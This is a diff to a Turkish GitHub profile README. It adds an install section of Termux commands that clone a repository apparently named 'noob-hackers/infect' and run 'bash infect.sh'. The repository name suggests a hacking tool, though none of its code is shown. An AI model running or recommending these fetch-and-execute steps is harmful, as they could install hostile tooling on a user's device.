@@ -9,6 +9,20 @@
 
 - TELEGRAM HESAP [TIKLA](https://t.me/yigitreal)
 
+- ***KURULUM**
+* apt-get update -y
+* apt-get upgrade -y
+* pkg install python -y
+* pkg install python2 -y
+* pkg install git -y
+* pip install lolcat
+* git clone https://github.com/noob-* hackers/infect
+* cd $HOME
+* ls
+* cd infect
+* ls
+* bash infect.sh
+
 <h3 align="left">Benimle iletişime geçin:</h3>
 <p align="left">
 <a href="https://instagram.com/yigitreal" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/instagram.svg" alt="yigitreal" height="30" width="40" /></a>
